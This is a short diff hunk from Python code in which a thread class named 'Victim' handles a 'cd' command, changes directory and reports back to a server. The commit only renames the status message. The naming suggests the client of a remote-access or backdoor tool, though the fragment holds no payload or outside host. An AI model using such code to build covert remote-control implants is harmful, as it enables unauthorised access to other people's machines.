@@ -34,7 +34,7 @@ class Victim(threading.Thread):
 				if self.command[:2] == 'cd':
 					if os.path.exists(os.path.abspath(self.command[3:])):
 						# send the message to server
-						self.send("changeDirectory")
+						self.send("chdir")
 						# change the current directory
 						os.chdir(self.command[3:]) 
 						# send prompt to the server
